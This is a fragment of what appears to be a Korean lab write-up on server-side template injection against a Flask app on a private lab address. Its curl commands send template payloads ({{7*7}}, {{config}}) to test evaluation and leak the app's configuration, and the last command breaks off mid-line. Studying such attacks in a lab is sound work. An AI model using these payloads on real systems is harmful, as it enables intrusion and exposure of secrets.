...
| 대상 | Ubuntu (192.168.0.30) — Python3 + Flask (포트 5000) |
...
```bash
curl -s "http://192.168.0.30:5000/?name=철수"
# → <h1>Hello 철수</h1>
```
...
```bash
curl -G "http://192.168.0.30:5000/" --data-urlencode "name={{7*7}}"
```
...
curl -G "http://192.168.0.30:5000/" --data-urlencode "name={{config}}"
```
...
```bash
curl -G "http://192.168.0.30:5000/" --data-urlencode \
